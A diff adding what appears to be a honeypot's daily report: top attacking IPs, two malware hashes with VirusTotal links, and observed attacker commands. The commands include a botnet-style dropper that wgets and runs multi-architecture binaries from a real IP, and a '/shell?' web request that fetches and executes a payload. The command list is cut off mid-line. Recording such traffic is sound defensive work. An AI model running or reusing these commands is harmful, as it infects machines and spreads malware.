@@ -1,0 +1,25 @@
+Top 5 IPs for 2024-06-27 :
+
+182.61.1.31
+150.109.196.7
+143.198.85.29
+103.146.159.177
+50.224.169.38
+
+Malware Observed:
+
+
+File name : sshd
+72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538
+https://www.virustotal.com/gui/file/72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538
+
+bc73558f39c391793e79298223fbb446df514a155ca5d5a28f5370b4f4d3e65a
+https://www.virustotal.com/gui/file/bc73558f39c391793e79298223fbb446df514a155ca5d5a28f5370b4f4d3e65a
+
+
+Commands/exploits observed:
+
+-e #!/bin/bash\n-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.234.247.60/mips; chmod +x mips; ./mips; rm -rf mips\n-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.234.247.60/mpsl; chmod +x mpsl; ./mpsl; rm -rf mpsl\n-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.234.247.60/sh4; chmod +x sh4; ./sh4; rm -rf sh4\n-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.234.247.60/x86; chmod +x x86; ./x86; rm -rf x86\n-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.234.247.60/x86_64; chmod +x x86_64; ./x86_64; rm -rf x86_64\n-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.234.247.60/arm; chmod +x arm; ./arm; rm -rf arm\n-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.234.247.60/arm5; chmod +x arm5; ./arm5; rm -rf arm5\n-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.234.247.60/arm6; chmod +x arm6; ./arm6; rm -rf arm6\n-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.234.247.60/arm7; chmod +x arm7; ./arm7; rm -rf arm7\n-e cd /tmp || cd 
+
+
+/shell?cd+/tmp;+rm+-rf+shk;+wget+http:/\\/45.148.10.78/shk;+chmod+777+shk;+./shk+jaws;+rm+-rf+shk
